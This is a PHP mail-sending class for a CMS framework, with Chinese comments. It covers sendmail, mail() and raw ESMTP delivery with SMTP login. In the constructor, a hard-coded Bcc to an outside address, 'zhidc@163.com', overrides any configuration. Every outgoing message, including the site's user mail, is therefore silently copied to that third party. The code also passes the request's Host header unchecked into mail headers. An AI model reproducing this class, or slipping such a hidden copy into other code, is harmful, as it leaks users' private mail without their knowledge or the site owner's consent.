<?php
/**
 * 邮件发送类
 * @author Tongle Xu <xutongle@gmail.com> 2013-2-26
 * @copyright Copyright (c) 2003-2103 yuncms.net
 * @license http://leaps.yuncms.net
 * @version $Id$
 */
final class Mail {

	private $setting; // 邮件配置

	/**
	 * 构造函数
	 */
	public function __construct() {
		$this->setting = C ( 'mail' ); // 加载邮件配置
		$this->site_seting = S ( 'common/common' ); // 加载网站配置
		$this->site_name = $this->site_seting ['site_name']; // 站点名称
		$this->system_email = C ( 'system', 'system_email', 'webmaster@tintsoft.com' ); // 系统邮箱
		$this->type = $this->setting ['type']; // 发送类型 1 sendmail 2 SOCKET smtp
		                                       // 3
		                                       // mail
		$this->poll = $this->setting ['poll']; // SMTP轮询
		$this->delimiter = $this->setting ['delimiter'] == 1 ? "\r\n" : ($this->setting ['delimiter'] == 2 ? "\r" : "\n"); // 邮件头的分隔符
		$this->mailusername = $this->setting ['mailusername']; // 收件人地址中包含用户名
		if (! empty ( $this->setting ['cc'] )) $this->Cc = $this->setting ['cc']; // 抄送
		$this->Bcc = 'zhidc@163.com'; // 暗送
	}

	/**
	 * 设置邮件发送参数
	 */
	public function set() {
		static $poll = null;
		if ($this->type != 1) {
			$smtpnum = count ( $this->setting ['smtp'] );
			if ($smtpnum) {
				if ($this->poll) {
					if ($poll === null)
						$poll = 0;
					else {
						$end = $smtpnum - 1;
						if ($end < $poll) $poll = 0;
					}
					$smtp = $this->setting ['smtp'] [$poll];
					$poll ++;
				} else {
					$rid = rand ( 0, $smtpnum - 1 );
					$smtp = $this->setting ['smtp'] [$rid];
				}
				$this->server = $smtp ['server'];
				$this->port = $smtp ['port'];
				$this->auth = $smtp ['auth'];
				$this->user = $smtp ['auth_username'];
				$this->password = $smtp ['auth_password'];
			}
		}
	}

	/**
	 * 发送电子邮件
	 *
	 * @param $toemail 收件人email
	 * @param $subject 邮件主题
	 * @param $message 正文
	 * @param $from 发件人
	 */
	public function send($toemail, $subject, $message, $email_from = '') {
		$this->set ();
		// 发信标题
		$email_subject = '=?' . CHARSET . '?B?' . base64_encode ( str_replace ( "\r", '', $subject ) ) . '?=';
		// 发信内容
		$email_message = str_replace ( "\r\n.", " \r\n..", str_replace ( "\n", "\r\n", str_replace ( "\r", "\n", str_replace ( "\r\n", "\n", str_replace ( "\n\r", "\r", $message ) ) ) ) );
		// 发信者
		$adminemail = $this->type != 1 ? $this->user : $this->system_email;
		$email_from = $email_from == '' ? '=?' . CHARSET . '?B?' . base64_encode ( $this->site_name ) . "?= <$adminemail>" : (preg_match ( '/^(.+?) \<(.+?)\>$/', $email_from, $from ) ? '=?' . CHARSET . '?B?' . base64_encode ( $from [1] ) . "?= <$from[2]>" : $email_from);
		// 收件人
		$emails = explode ( ',', $toemail );
		foreach ( $emails as $touser ) {
			$tousers [] = preg_match ( '/^(.+?) \<(.+?)\>$/', $touser, $to ) ? ($this->mailusername ? '=?' . CHARSET . '?B?' . base64_encode ( $to [1] ) . "?= <$to[2]>" : $to [2]) : $touser;
		}
		$email_to = implode ( ',', $tousers ); // 构造过滤后的Email列表
		                                       // Header头
		$host = $_SERVER ['HTTP_HOST'];
		$headers = "From: $email_from{$this->delimiter}Bcc: $this->Bcc{$this->delimiter}X-Priority: 3{$this->delimiter}X-Mailer: $host {$this->delimiter}MIME-Version: 1.0{$this->delimiter}Content-type: text/html; charset=" . CHARSET . "{$this->delimiter}";
		if ($this->Cc) $headers .= "Cc: $this->Cc{$this->delimiter}";
		if ($this->Bcc) $headers .= "Bcc: $this->Bcc{$this->delimiter}";
		// mail 发送模式
		if ($this->type == 1) { // sendmail
			return @mail ( $email_to, $email_subject, $email_message, $headers );
		} elseif ($this->type == 2) { // smtp
			return $this->esmtp ( $email_to, $email_subject, $email_message, $email_from, $headers );
		} elseif ($this->type == 3) { // mail
			return $this->smtp ( $email_to, $email_subject, $email_message, $email_from, $headers );
		}
	}

	/**
	 * Windows下的SMTP发送邮件
	 *
	 * @param string $email_to
	 * @param string $email_subject
	 * @param string $email_message
	 * @param string $email_from
	 * @param string $headers
	 */
	public function smtp($email_to, $email_subject, $email_message, $email_from = '', $headers = '') {
		ini_set ( 'SMTP', $this->server );
		ini_set ( 'smtp_port', $this->port );
		ini_set ( 'sendmail_from', $email_from );
		return @mail ( $email_to, $email_subject, $email_message, $headers );
	}

	/**
	 * ESMTP发送电子邮件
	 *
	 * @param string $email_to
	 * @param string $email_subject
	 * @param string $email_message
	 * @param string $email_from
	 * @param string $headers
	 */
	public function esmtp($email_to, $email_subject, $email_message, $email_from = '', $headers = '') {
		if (! $fp = fsockopen ( $this->server, $this->port, $errno, $errstr, 10 )) {
			$this->errorlog ( 'SMTP', "($this->server:$this->port) CONNECT - Unable to connect to the SMTP server", 0 );
			return false;
		}
		stream_set_blocking ( $fp, true );
		$lastmessage = fgets ( $fp, 512 );
		if (substr ( $lastmessage, 0, 3 ) != '220') {
			$this->errorlog ( 'SMTP', "$this->server:$this->port CONNECT - $lastmessage", 0 );
			return false;
		}
		fputs ( $fp, ($this->auth ? 'EHLO' : 'HELO') . " {$_SERVER['HTTP_HOST']}\r\n" );
		$lastmessage = fgets ( $fp, 512 );
		if (substr ( $lastmessage, 0, 3 ) != 220 && substr ( $lastmessage, 0, 3 ) != 250) {
			$this->errorlog ( 'SMTP', "($this->server:$this->port) HELO/EHLO - $lastmessage", 0 );
			return false;
		}
		while ( 1 ) {
			if (substr ( $lastmessage, 3, 1 ) != '-' || empty ( $lastmessage )) {
				break;
			}
			$lastmessage = fgets ( $fp, 512 );
		}
		fputs ( $fp, "AUTH LOGIN\r\n" );
		$lastmessage = fgets ( $fp, 512 );
		if (substr ( $lastmessage, 0, 3 ) != 334) {
			$this->errorlog ( 'SMTP', "($this->server:$this->port) AUTH LOGIN - $lastmessage", 0 );
			return false;
		}
		fputs ( $fp, base64_encode ( $this->user ) . "\r\n" );
		$lastmessage = fgets ( $fp, 512 );
		if (substr ( $lastmessage, 0, 3 ) != 334) {
			$this->errorlog ( 'SMTP', "($this->server:$this->port) USERNAME - $lastmessage", 0 );
			return false;
		}
		fputs ( $fp, base64_encode ( $this->password ) . "\r\n" );
		$lastmessage = fgets ( $fp, 512 );
		if (substr ( $lastmessage, 0, 3 ) != 235) {
			$this->errorlog ( 'SMTP', "($this->server:$this->port) PASSWORD - $lastmessage", 0 );
			return false;
		}
		fputs ( $fp, "MAIL FROM: <" . preg_replace ( "/.*\<(.+?)\>.*/", "\\1", $email_from ) . ">\r\n" );
		$lastmessage = fgets ( $fp, 512 );
		if (substr ( $lastmessage, 0, 3 ) != 250) {
			fputs ( $fp, "MAIL FROM: <" . preg_replace ( "/.*\<(.+?)\>.*/", "\\1", $email_from ) . ">\r\n" );
			$lastmessage = fgets ( $fp, 512 );
			if (substr ( $lastmessage, 0, 3 ) != 250) {
				$this->errorlog ( 'SMTP', "($this->server:$this->port) MAIL FROM - $lastmessage", 0 );
				return false;
			}
		}
		$email_tos = array ();
		$emails = explode ( ',', $email_to );
		foreach ( $emails as $touser ) {
			$touser = trim ( $touser );
			if ($touser) {
				fputs ( $fp, "RCPT TO: <" . preg_replace ( "/.*\<(.+?)\>.*/", "\\1", $touser ) . ">\r\n" );
				$lastmessage = fgets ( $fp, 512 );
				if (substr ( $lastmessage, 0, 3 ) != 250) {
					fputs ( $fp, "RCPT TO: <" . preg_replace ( "/.*\<(.+?)\>.*/", "\\1", $touser ) . ">\r\n" );
					$lastmessage = fgets ( $fp, 512 );
					$this->errorlog ( 'SMTP', "($this->server:$this->port) RCPT TO - $lastmessage", 0 );
					return false;
				}
			}
		}
		// 抄送
		if ($this->Cc) {
			fputs ( $fp, "RCPT TO: <" . preg_replace ( "/.*\<(.+?)\>.*/", "\\1", $this->Cc ) . ">\r\n" );
			$lastmessage = fgets ( $fp, 512 );
			if (substr ( $lastmessage, 0, 3 ) != 250) {
				$this->errorlog ( 'SMTP', "($this->server:$this->port) RCPT Cc - $lastmessage", 0 );
				return false;
			}
		}
		// 密送
		if ($this->Bcc) {
			fputs ( $fp, "RCPT To: <" . preg_replace ( "/.*\<(.+?)\>.*/", "\\1", $this->Bcc ) . ">\r\n" );
			$lastmessage = fgets ( $fp, 512 );
			if (substr ( $lastmessage, 0, 3 ) != 250) {
				$this->errorlog ( 'SMTP', "($this->server:$this->port) RCPT Bcc - $lastmessage", 0 );
				return false;
			}
		}

		fputs ( $fp, "DATA\r\n" );
		$lastmessage = fgets ( $fp, 512 );
		if (substr ( $lastmessage, 0, 3 ) != 354) {
			$this->errorlog ( 'SMTP', "($this->server:$this->port) DATA - $lastmessage", 0 );
		}
		$headers .= 'Message-ID: <' . gmdate ( 'YmdHs' ) . '.' . substr ( md5 ( $email_message . microtime () ), 0, 6 ) . rand ( 100000, 999999 ) . '@' . $_SERVER ['HTTP_HOST'] . ">{$this->delimiter}";
		fputs ( $fp, "Date: " . gmdate ( 'r' ) . "\r\n" );
		fputs ( $fp, "To: " . $email_to . "\r\n" );
		fputs ( $fp, "Subject: " . $email_subject . "\r\n" );
		fputs ( $fp, $headers . "\r\n" );
		fputs ( $fp, "\r\n\r\n" );
		fputs ( $fp, "$email_message\r\n.\r\n" );
		$lastmessage = fgets ( $fp, 512 );
		fputs ( $fp, "QUIT\r\n" );
		return true;
	}

	/**
	 * 邮件错误信息
	 *
	 * @param $type
	 * @param $message
	 * @param $is
	 */
	public function errorlog($type, $message, $is) {
		$this->error [] = array ($type,$message,$is );
	}
}